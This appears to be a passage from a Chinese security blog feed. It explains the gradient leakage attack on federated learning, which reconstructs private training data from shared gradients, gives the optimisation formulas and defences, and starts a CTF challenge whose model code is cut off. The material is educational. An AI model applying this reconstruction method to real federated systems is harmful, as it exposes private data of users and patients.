<p><a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
<p><a href="https://wh1tej0ker.github.io/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/">AI-CTF（2）LeNet | Wh1teJ0ker</a></p>
<p><a href="https://wh1tej0ker.github.io/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/">AI-CTF（3）network-in-network | Wh1teJ0ker</a></p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI安全</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-安全（2）梯度泄露攻击</title>
    <url>/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1>梯度泄露攻击</h1>
<h2 id="什么是梯度？">什么是梯度？</h2>
<p>梯度是一个向量求导的导数，使用梯度就是为了寻找最快得到损失函数的方向，而梯度交换是现代多节点机器学习系统中广泛使用的一种方法。</p>
<h2 id="什么是联邦学习？">什么是联邦学习？</h2>
<p>首先明确，联邦学习本质上是一种<strong>分布式</strong>机器学习技术，或机器学习<strong>框架</strong>。</p>
<p>联邦学习的目标是在保证数据隐私安全及合法合规的基础上，实现共同建模，提升AI模型的效果。</p>
<p>众所周知，人工智能技术有两个关键点，模型和数据，而受限于数据量巨大，集中不易，产生了分布式机器学习技术，在此之上，联邦学习于 2016 年被谷歌首次提出，设计动机是为了在智能程序训练的过程中保护手机或平板电脑中用户的隐私数据，进而提出一种数据不动模型动的新型分布式机器学习范式，称之为 Federated Learning，中文译为联邦学习。</p>
<p>能够保护隐私的原因是每个用户的数据始终储存在本地，仅有模型的梯度在不同设备之前传播。这类算法不需要将数据集中到一处，可以在保护用户隐私的同时，也让模型从海量数据中受益。例如多家医院可以共同训练一个医疗模型而无需共享患者的医疗数据。</p>
<p>根据各参与方数据划分的不同，联邦学习可以分为横向联邦学习，纵向联邦学习和联邦迁移学习。</p>
<p><img src="https://s2.loli.net/2023/11/15/Q3tMkjqGnIErmgB.png" alt=""></p>
<h2 id="攻击原理及过程">攻击原理及过程</h2>
<p>论文原址<a href="https://arxiv.org/abs/1906.08935">Deep Leakage from Gradients </a></p>
<p>每个节点对样本进行采样，进行节点处的梯度计算</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo separator="true">,</mo><msub><mi>W</mi><mi>t</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>y</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>W</mi><mi>t</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\nabla W_ {t,i} =  \frac {\partial  \ell (F(x_ {t,i},W_ {t}),y_ {t,i})}{\partial W_ {t}}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.263em;vertical-align:-0.836em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.836em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>梯度在N个服务器上被平均</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mi>t</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>N</mi></mfrac><munderover><mo>∑</mo><mi>j</mi><mi>N</mi></munderover><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\nabla W_ {t}  =  \frac {1}{N}   \sum _ {j}^ {N}   \nabla W_ {t,j}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.2421em;vertical-align:-1.4138em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>平均后进行权重更新</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>W</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>W</mi><mi>t</mi></msub><mo>−</mo><mi>η</mi><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">W_ {t+1}=W_ {t}-\eta   \nabla W_ {t}  
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>而现在由于梯度共享，所以我们的目标就是从梯度去对原始数据进行恢复</p>
<p>为了从梯度中恢复出数据，我们首先随机初始化一对伪输入x’和标签y‘。然后将其输入模型并获取伪梯度</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∇</mi><msup><mi>W</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>W</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><mi>W</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\nabla W&#x27;=  \frac {\partial  \ell(F(x&#x27;,W),y&#x27;)}{\partial W} 
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8019em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.1149em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4289em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>优化伪梯度让其接近原始梯度的过程中，伪数据也会逐渐接近原始的真实训练数据。</p>
<p>给定某一步的梯度，通过最小化如下目标来获得训练数据</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>x</mi><mrow><mo mathvariant="normal">′</mo><mo lspace="0em" rspace="0em">∗</mo></mrow></msup><mo separator="true">,</mo><msup><mi>y</mi><mrow><mo mathvariant="normal">′</mo><mo lspace="0em" rspace="0em">∗</mo></mrow></msup><mo>=</mo><mi>a</mi><mi>r</mi><mi>g</mi><mi><munder><mo><mi>min</mi><mo>⁡</mo></mo><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></munder></mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∇</mi><msup><mi>W</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>−</mo><mi mathvariant="normal">∇</mi><mi>W</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo>=</mo><mi>a</mi><mi>r</mi><mi>g</mi><mi><munder><mo><mi>min</mi><mo>⁡</mo></mo><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></munder></mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>W</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><mi>W</mi></mrow></mfrac><mo>−</mo><mi mathvariant="normal">∇</mi><mi>W</mi><mi mathvariant="normal">∣</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">x&#x27;^{*},y&#x27;^{*}=arg \underset{x&#x27;,y&#x27;} \min |\nabla W&#x27;- \nabla W|^ {2}=arg \underset{x&#x27;,y&#x27;} \min ||\frac {\partial \ell(F(x&#x27;,W),y&#x27;)}{\partial W}-\nabla W||^ {2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9963em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.682em;vertical-align:-0.8801em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-2.356em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span></span></span></span></span></span></span><span class="mord">∣∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.309em;vertical-align:-0.8801em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-2.356em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span></span></span></span></span></span></span><span class="mord">∣∣</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4289em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<p><img src="https://s2.loli.net/2023/11/15/oW7iNazH62uURIT.png" alt=""></p>
<h2 id="防御手段">防御手段</h2>
<p>同时，在给出攻击方法的同时，论文也针对性讨论了防御手段。另外也发现了部分升级版攻击手法，之后会继续尝试复现。</p>
<p>使用加密技术对梯度数据进行加密，或者将幅度较小的梯度剪枝为0.另外，论文以外也有人尝试过将梯度添加噪声。</p>
<h2 id="例题尝试">例题尝试</h2>
<p>*<strong>CTF2022-Alice’s challenge</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span 